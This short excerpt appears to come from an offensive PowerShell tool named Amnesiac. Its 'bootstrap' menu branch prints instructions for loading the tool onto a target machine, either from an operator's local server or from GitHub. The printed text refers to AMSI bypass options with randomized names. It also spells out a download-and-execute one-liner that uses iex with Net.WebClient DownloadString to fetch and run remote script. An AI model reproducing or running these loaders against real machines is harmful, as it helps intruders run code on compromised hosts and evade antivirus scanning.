...
function Amnesiac {
	...
	while ($true) {
		...
		if ($choice -eq 'bootstrap') {
			...
			Write-Output " -------------------------------------------------"
			Write-Output " [*] Load with local serve (operator on network):"
			Write-Output "     $_load"
			Write-Output ""
			Write-Output " [*] Load from GitHub -- no local server (target needs outbound HTTPS to github.com):"
			Write-Output "     Paste 3 lines -- option [5] bypass, no PS AMSI reflection, names randomized:"
			Write-Output "     $_gh3l1"
			Write-Output "     $_gh3l2"
			Write-Output "     $_gh3l3"
			Write-Output ""
			Write-Output "     GitHub PS-only fallback (weaker -- run option [1] bypass first, then):"
			Write-Output "     iex (New-Object Net.WebClient).DownloadString('$_ghPs1');Amnesiac"
			Write-Output ""
			continue
		}
